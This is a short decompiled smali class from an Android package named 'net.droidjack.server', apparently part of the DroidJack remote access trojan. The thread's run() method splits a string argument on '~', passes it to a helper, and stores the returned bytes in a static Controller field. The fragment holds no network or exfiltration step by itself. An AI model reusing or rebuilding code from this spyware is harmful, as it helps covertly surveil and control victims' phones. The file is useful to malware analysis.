.class Lnet/droidjack/server/ac;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lnet/droidjack/server/aa;

.field private final synthetic b:[Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/aa;[Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/ac;->a:Lnet/droidjack/server/aa;

    iput-object p2, p0, Lnet/droidjack/server/ac;->b:[Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    iget-object v0, p0, Lnet/droidjack/server/ac;->b:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object v1, v0, v1

    iget-object v0, p0, Lnet/droidjack/server/ac;->b:[Ljava/lang/String;

    const/4 v2, 0x2

    aget-object v2, v0, v2

    const/4 v0, 0x0

    if-eqz v2, :cond_0

    const-string v0, "~"

    invoke-virtual {v2, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    :cond_0
    invoke-static {v1, v0}, Lnet/droidjack/server/l;->a(Ljava/lang/String;[Ljava/lang/String;)[B

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->v:[B

    return-void
.end method
